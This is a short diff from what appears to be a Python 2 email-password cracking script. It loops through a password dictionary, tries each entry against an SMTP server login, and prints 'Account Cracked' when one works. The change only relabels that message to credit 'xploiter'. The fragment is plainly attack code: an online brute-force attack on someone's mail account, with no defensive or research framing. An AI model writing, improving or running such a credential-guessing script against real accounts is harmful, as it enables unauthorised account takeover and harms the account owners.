@@ -35,7 +35,7 @@ for password in dictionary:
         try:
                 smtpserver.login(email, password)
 
-                print ("Account Cracked: %s" % password);
+                print ("Account Cracked by xploiter: %s" % password);
                 break; 
         except smtplib.SMTPAuthenticationError:
                 print "Password Incorrect: %s" % password
